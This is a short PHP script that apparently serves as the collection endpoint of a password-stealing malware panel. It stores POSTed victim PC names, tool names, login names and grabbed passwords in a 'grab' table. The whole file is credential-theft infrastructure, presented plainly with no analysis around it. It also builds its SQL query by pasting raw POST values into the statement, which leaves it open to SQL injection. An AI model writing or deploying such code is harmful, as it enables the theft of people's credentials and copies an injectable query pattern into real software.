<?php
include('include/config.php');

if(isset($_POST['tool'])){
		$query = "	INSERT INTO
						".$sql_table['grab']."(PCname, ToolName, LinkTool, LoginName, PassGrabb)
					VALUES
						(
						'".$_POST['pcname']."',
						'".$_POST['tool']."',
						'".$_POST['link']."',
						'".$_POST['username']."',
						'".$_POST['passwort']."'
						);"; 
		$result = $db->query($query);
	    }		
?>